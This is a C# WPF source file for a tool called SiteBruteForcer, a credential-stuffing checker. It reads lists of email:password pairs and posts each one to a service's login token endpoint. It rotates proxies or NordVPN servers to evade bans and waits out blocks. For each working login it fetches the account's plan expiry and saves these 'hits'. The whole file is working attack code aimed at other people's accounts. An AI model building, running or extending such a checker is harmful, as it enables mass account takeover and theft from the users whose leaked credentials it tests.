using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows;
using System.Windows.Threading;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;
using RestSharp;
using ThreadGun;

namespace SiteBruteForcer
{
    public partial class MainWindow
    {
        private static readonly object FileLock = new object();
        private static readonly object ProxyLock = new object();
        private int _checked;
        private string _currentNordServer;
        private NetworkCredential _nordNetworkCredential;
        private int _proxyChecked;
        private int _proxyError;
        private int _proxyIndex;
        private bool _saveRemainingItems;
        private StreamWriter _saveRemainingItemsFile;
        private string _saveRemainingItemsPath;
        public List<ComboItem> ComboList = new List<ComboItem>();
        public List<Proxy> ProxyList = new List<Proxy>();
        public ThreadGun<ComboItem> ThreadGun;

        public MainWindow()
        {
            NordServer.ServersList = NordServer.ServersList.OrderBy(a => Guid.NewGuid()).ToList();
            InitializeComponent();
        }

        private void btnLoadCombo_Click(object sender, RoutedEventArgs e)
        {
            var openFileDialog = new OpenFileDialog {Filter = "Text files (*.txt)|*.txt"};
            if (openFileDialog.ShowDialog() != true) return;
            var comboList = File.ReadAllLines(openFileDialog.FileName).Distinct();
            foreach (var comboItem in comboList)
            {
                if (!comboItem.Contains(":") || !comboItem.Contains("@")) continue;
                var strings = comboItem.Split(':');
                if (string.IsNullOrEmpty(strings[0]) || string.IsNullOrEmpty(strings[1])) continue;
                ComboList.Add(new ComboItem {UserOrEmail = strings[0], Password = strings[1]});
            }

            lblComboCount.Content = "Item Loaded : " + ComboList.Count;
        }

        private void btnStart_Click(object sender, RoutedEventArgs e)
        {
            if (!string.IsNullOrWhiteSpace(txtNordAccount.Text))
            {
                var account = txtNordAccount.Text.Split(':');
                _nordNetworkCredential = new NetworkCredential(account[0], account[1]);
                _currentNordServer = NordServer.ServersList[0];
            }

            if (_nordNetworkCredential == null && ProxyList.Count == 0)
            {
                MessageBox.Show("load proxy ServersList or set nord account");
                return;
            }

            if (ComboList.Count == 0)
            {
                MessageBox.Show("load ComboList");
                return;
            }

            if (ReferenceEquals(lblStatus.Content, "Status : Checking Proxies..."))
            {
                MessageBox.Show("wait to complete checking proxies");
                return;
            }

            ThreadGun = new ThreadGun<ComboItem>((Action<ComboItem>) Config, ComboList, (int) sldThreadCount.Value,
                CompletedEvent,
                ExceptionOccurredEvent).FillingMagazine();
            ThreadGun.Start();
            lblStatus.Content = "Status : Process Started...";

            new Thread(Status).Start();
        }

        private void Status()
        {
            while (true)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Normal, (ThreadStart) delegate
                {
                    lblComboCount.Content = "Checked : " + _checked;
                    lblProxyError.Content = "Error Proxy : " + _proxyError;
                });
                Thread.Sleep(500);
            }
        }

        private void ExceptionOccurredEvent(ThreadGun<ComboItem> gun, IEnumerable<ComboItem> inputs, object input,
            Exception exception)
        {
            lock (FileLock)
            {
                File.AppendAllText("Error.txt", ((ComboItem) input).UserOrEmail + ':' + ((ComboItem) input).Password);
            }
        }

        private void CompletedEvent(IEnumerable<ComboItem> inputs)
        {
            _saveRemainingItemsFile?.Close();
            Dispatcher.BeginInvoke(DispatcherPriority.Normal,
                (ThreadStart) delegate { lblStatus.Content = "Status : Process Finished!"; });
        }

        private void Config(ComboItem item)
        {
            if (_saveRemainingItems)
            {
                _saveRemainingItemsFile.WriteLine(item.UserOrEmail + ":" + item.Password);
                return;
            }

            var request = new RestRequest(Method.POST);
            request.AddParameter("application/x-www-form-urlencoded",
                $@"username={item.UserOrEmail}&password={item.Password}",
                ParameterType.RequestBody);
            var proxy = GetProxy();
            var response =
                new RestClient("https://zwyr157wwiu6eior.com/v1/users/tokens")
                {
                    Proxy = proxy
                }.Execute(request);

            if (!response.Content.Contains("{\""))
            {
                if (response.Content.Contains("Proxy Access Denied.") || response.StatusCode == 0)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Normal,
                        (ThreadStart) delegate { lblStatus.Content = "Status : Waiting to get out of the ban"; });
                    ThreadGun.Wait(10 * 60 * 1000,
                        () => Dispatcher.BeginInvoke(DispatcherPriority.Normal,
                            (ThreadStart) delegate { lblStatus.Content = "Status : Process Started..."; }));
                }

                SetNewNordServer(proxy.Address.Host);
                _proxyError++;
                ThreadGun.FillingMagazine(item);
                return;
            }

            _checked++;
            if (response.StatusCode == HttpStatusCode.Unauthorized ||
                response.StatusCode == HttpStatusCode.BadRequest) return;

            var validUntil = "Nan";
            try
            {
                request = new RestRequest(Method.GET);
                request.AddHeader("Authorization", "Bearer token:" + JObject.Parse(response.Content)["token"]);
                response = new RestClient("https://zwyr157wwiu6eior.com/v1/users/services").Execute(request);
                if (response.Content == "[]") validUntil = "WithoutPlan";
                validUntil = JArray.Parse(response.Content)[0]["expires_at"].ToString();
            }
            catch
            {
                /* ignored */
            }

            Dispatcher.BeginInvoke(DispatcherPriority.Normal,
                (ThreadStart) delegate
                {
                    lstHit.Items.Add(new ComboItem
                    {
                        UserOrEmail = item.UserOrEmail,
                        Password = item.Password,
                        ValidUntil = validUntil
                    });
                });
        }

        public void SetNewNordServer(string currentServer)
        {
            _currentNordServer = NordServer.ServersList[NordServer.ServersList.IndexOf(currentServer) + 1];
        }

        public void CheckingProxy(Proxy proxy)
        {
            var response =
                new RestClient("https://zwyr157wwiu6eior.com/user/loginv2")
                {
                    Proxy = new WebProxy(proxy.Address, proxy.Port)
                }.Execute(new RestRequest(Method.GET) {Timeout = 2000});
            if (response.Content.Contains("{\""))
                ProxyList.Add(proxy);
            Dispatcher.BeginInvoke(DispatcherPriority.Normal,
                (ThreadStart) delegate { lblProxyCount.Content = "Proxy Checked : " + ++_proxyChecked; });
        }

        private WebProxy GetProxy()
        {
            lock (ProxyLock)
            {
                if (_nordNetworkCredential != null)
                    return new WebProxy(_currentNordServer, 80)
                    {
                        Credentials = _nordNetworkCredential
                    };
                if (ProxyList.Count == 0) return null;
                if (_proxyIndex >= ProxyList.Count - 1) _proxyIndex = 0;
                var proxy = ProxyList[_proxyIndex];
                _proxyIndex++;
                return new WebProxy(proxy.Address, proxy.Port);
            }
        }

        private void btnSaveHits_Click(object sender, RoutedEventArgs e)
        {
            var savedialoge = new SaveFileDialog {Filter = "Text File (*.txt)|*.txt"};
            if (savedialoge.ShowDialog() != true) return;
            var file = new StreamWriter(savedialoge.FileName);
            foreach (var item in lstHit.Items.Cast<ComboItem>())
                file.WriteLine(item.UserOrEmail + ":" + item.Password + ":" + item.ValidUntil);
            file.Close();
        }

        private void sldThreadCount_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            lblThreadCount.Content = "Thread Count : " + (int) sldThreadCount.Value;
        }

        private void Window_Closing(object sender, CancelEventArgs e)
        {
            Environment.Exit(0);
        }

        private void btnLoadProxyList_Click(object sender, RoutedEventArgs e)
        {
            var openFileDialog = new OpenFileDialog {Filter = "Text files (*.txt)|*.txt"};
            if (openFileDialog.ShowDialog() != true) return;
            var proxyList = File.ReadAllLines(openFileDialog.FileName).Distinct();
            var _proxyList = new List<Proxy>();
            foreach (var proxyItem in proxyList)
            {
                if (!proxyItem.Contains(":")) continue;
                var strings = proxyItem.Split(':');
                if (string.IsNullOrEmpty(strings[0]) || string.IsNullOrEmpty(strings[1])) continue;
                try
                {
                    _proxyList.Add(new Proxy {Address = strings[0], Port = int.Parse(strings[1])});
                }
                catch
                {
                }
            }

            _proxyList.AddRange(_proxyList);
            lblStatus.Content = "Status : Checking Proxies...";
            new ThreadGun<Proxy>((Action<Proxy>) CheckingProxy, _proxyList, (int) sldThreadCount.Value, inputs =>
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Normal,
                    (ThreadStart) delegate
                    {
                        ProxyList = ProxyList.Distinct().ToList();
                        lblProxyCount.Content = "Proxy Loaded : " + ProxyList.Count;
                        lblStatus.Content = "Status : Checking Proxies Finished!";
                    });
            }).FillingMagazine().Start();
            btnLoadProxyList.Content = "Reload ProxyList";
        }

        private void btnSaveGoodProxy_Click(object sender, RoutedEventArgs e)
        {
            if (ReferenceEquals(lblStatus.Content, "Status : Checking Proxies..."))
            {
                MessageBox.Show("wait to complete checking proxies");
                return;
            }

            var savedialoge = new SaveFileDialog {Filter = "Text File (*.txt)|*.txt"};
            if (savedialoge.ShowDialog() != true) return;
            var file = new StreamWriter(savedialoge.FileName);
            foreach (var item in ProxyList.Distinct())
                file.WriteLine(item.Address + ":" + item.Port);
            file.Close();
        }

        private void btnSaveRemainingItems_Click(object sender, RoutedEventArgs e)
        {
            var savedialoge = new SaveFileDialog {Filter = "Text File (*.txt)|*.txt"};
            if (savedialoge.ShowDialog() != true) return;
            _saveRemainingItemsPath = savedialoge.FileName;
            _saveRemainingItemsFile = new StreamWriter(_saveRemainingItemsPath);
            _saveRemainingItems = true;
        }

        public class ComboItem
        {
            public string UserOrEmail { set; get; }
            public string Password { set; get; }
            public string ValidUntil { set; get; }
        }

        public class Proxy
        {
            public string Address { set; get; }
            public int Port { set; get; }
        }
    }
}